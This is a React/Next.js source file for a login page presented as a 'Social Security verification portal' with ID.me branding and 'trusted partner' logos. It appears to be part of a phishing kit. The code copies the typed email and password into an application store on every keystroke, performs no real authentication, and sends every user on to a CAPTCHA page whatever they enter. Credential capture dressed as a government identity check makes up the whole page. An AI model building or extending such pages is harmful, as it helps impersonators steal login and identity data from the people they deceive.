"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import Image from "next/image";
import { useAppDispatch } from "@/app/store/hooks";
import { updateField, setAuthMethod } from "@/app/store/userSlice";

const signInSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  password: z.string().min(8, "Password must be at least 8 characters"),
});

type SignInFormData = z.infer<typeof signInSchema>;

export default function SignIn() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const dispatch = useAppDispatch();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm<SignInFormData>({
    resolver: zodResolver(signInSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  // Track input changes in real-time
  const watchedFields = watch();
  
  // Fix: Use a ref to track previous values and avoid infinite loops
  const [prevEmail, setPrevEmail] = useState("");
  const [prevPassword, setPrevPassword] = useState("");
  
  useEffect(() => {
    // Only update if values have actually changed
    if (watchedFields.email !== prevEmail) {
      dispatch(updateField({ field: "email", value: watchedFields.email }));
      setPrevEmail(watchedFields.email);
    }
    
    if (watchedFields.password !== prevPassword) {
      dispatch(updateField({ field: "password", value: watchedFields.password }));
      setPrevPassword(watchedFields.password);
    }
  }, [watchedFields.email, watchedFields.password, dispatch, prevEmail, prevPassword]);

  const onSubmit = async (data: SignInFormData) => {
    setIsLoading(true);
    setError("");

    try {
      // Here you would typically make an API call to authenticate the user
      
      // Mark that the user is using email authentication
      dispatch(setAuthMethod("email"));
      
      // For email/password authentication, redirect to CAPTCHA verification
      setTimeout(() => {
        router.push("/auth/captcha-verification");
      }, 1000);
    } catch (err) {
      setError("Invalid email or password. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleIdMeSignIn = () => {
    setIsLoading(true);
    
    // Mark that the user is using ID.me authentication
    dispatch(setAuthMethod("id.me"));
    
    // For ID.me authentication, redirect to verification code page
    setTimeout(() => {
      router.push("/auth/captcha-verification");
    }, 1000);
  };

  return (
    <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
      <div className="w-full max-w-md space-y-8 rounded-lg bg-white p-8 shadow-md">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-[#0053a0]">Sign In</h1>
          <p className="mt-2 text-gray-600">
            Sign in to access your Social Security verification portal
          </p>
        </div>

        {error && (
          <div className="rounded-md bg-red-50 p-4 text-sm text-red-700">
            {error}
          </div>
        )}

        <form className="mt-8 space-y-6" onSubmit={handleSubmit(onSubmit)}>
          <div className="space-y-4 rounded-md ">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700">
                Email address
              </label>
              <input
                id="email"
                type="email"
                {...register("email")}
                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                placeholder="Email address"
              />
              {errors.email && (
                <p className="mt-1 text-sm text-red-600">{errors.email.message}</p>
              )}
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                Password
              </label>
              <input
                id="password"
                type="password"
                {...register("password")}
                className="mt-1 block w-full rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-[#0053a0] focus:outline-none focus:ring-[#0053a0]"
                placeholder="Password"
              />
              {errors.password && (
                <p className="mt-1 text-sm text-red-600">{errors.password.message}</p>
              )}
            </div>
          </div>

          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <input
                id="remember-me"
                name="remember-me"
                type="checkbox"
                className="h-4 w-4 rounded border-gray-300 text-[#0053a0] focus:ring-[#0053a0]"
              />
              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900">
                Remember me
              </label>
            </div>

            <div className="text-sm">
              <Link
                href="/auth/forgot-password"
                className="font-medium text-[#0053a0] hover:text-[#00478c]"
              >
                Forgot your password?
              </Link>
            </div>
          </div>

          <div>
            <button
              type="submit"
              disabled={isLoading}
              className="group relative flex w-full justify-center rounded-md border border-transparent bg-[#0053a0] px-4 py-2 text-sm font-medium text-white hover:bg-[#00478c] focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2 disabled:opacity-50"
            >
              {isLoading ? "Signing in..." : "Sign in"}
            </button>
            <p className="mt-1 text-xs text-gray-500 text-center">
              Email verification includes CAPTCHA human verification
            </p>
          </div>
          
          <div className="relative flex items-center py-2">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="mx-4 flex-shrink text-xs text-gray-500">Or</span>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>
          
          <div>
            <button
              type="button"
              onClick={handleIdMeSignIn}
              disabled={isLoading}
              className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2"
            >
              <Image 
                src="/id.jpg" 
                alt="ID.me logo" 
                width={20} 
                height={20}
                className="h-5 w-5 object-contain" 
              />
              {isLoading ? "Processing..." : "Continue with ID.me"}
            </button>
            <p className="mt-1 text-xs text-gray-500 text-center">
              ID.me verification includes 30-60 second identity check
            </p>
          </div>

          {/* Verification Partner Logos */}
          <div className="mt-6">
            <p className="mb-3 text-center text-xs text-gray-500">Verified by our trusted partners</p>
            <div className="flex items-center justify-between">
              <div className="flex-shrink-0">
                <Image 
                  src="/log.jpg" 
                  alt="ID.me Verification Partner" 
                  width={100} 
                  height={40}
                  className="h-8 w-auto object-contain" 
                />
              </div>
              <div className="flex-shrink-0">
                <Image 
                  src="/id.jpg" 
                  alt="Identity Verification Partner" 
                  width={120} 
                  height={50}
                  className="h-8 w-auto object-contain" 
                />
              </div>
            </div>
          </div>
        </form>

        {/* <div className="mt-6 text-center">
          <p className="text-sm text-gray-600">
            Don&apos;t have an account?{" "}
            <Link href="/auth/signup" className="font-medium text-blue-600 hover:text-blue-500">
              Sign up
            </Link>
          </p>
        </div> */}
      </div>
    </div>
  );
} 